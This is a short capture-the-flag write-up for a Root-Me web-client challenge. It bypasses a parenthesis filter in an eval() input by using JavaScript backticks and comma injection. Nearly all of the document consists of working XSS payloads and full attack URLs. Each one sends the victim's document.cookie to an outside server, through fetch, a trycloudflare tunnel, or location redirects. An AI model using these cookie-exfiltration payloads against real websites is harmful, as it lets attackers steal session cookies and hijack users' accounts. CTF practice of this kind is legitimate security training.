In this challenge, `(` and `)` were blocked. However, this restriction can be easily bypassed using backticks `` ` ``.

Since the payload is executed within an eval() function, I can inject a second command using a comma.
```
2-1,alert`1`
```

Final payload:
```
2-1,fetch`https://my-server/?c=`.concat`document.cookie`
```
```
http://challenge01.root-me.org/web-client/ch34/?calculation=2-1%2Cfetch%60https%3A%2F%2Freaching-disease-technologies-night.trycloudflare.com%2F%3Fc%3D%60.concat%60document.cookie%60
```
**Alternative Payloads**
```
2-1,document.location=`https://my-server.com/?c=`%2bdocument.cookie
```
```
http://challenge01.root-me.org/web-client/ch34/?calculation=2-1,document.location=`https://reaching-disease-technologies-night.trycloudflare.com/?c=`%2bdocument.cookie
```

**Alternative Payloads**

JavaScript automatically converts between different data types. For example:
    

    1+1+[5*5] // result "225"

By leveraging this behavior, I can inject:

    1+1+[location.href='//my-server.com/?c='+document.cookie]
